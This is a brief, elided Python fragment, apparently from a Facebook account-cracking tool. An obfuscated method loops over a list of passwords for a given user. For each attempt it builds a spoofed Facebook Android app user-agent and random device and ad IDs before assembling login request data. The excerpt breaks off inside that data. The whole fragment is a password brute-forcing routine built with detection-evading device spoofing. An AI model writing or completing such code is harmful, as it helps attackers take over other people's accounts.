    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/iQOO;FBBD/Iqoo;FBPN/com.facebook.katana;FBDV/iQOO Z7 Pro;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
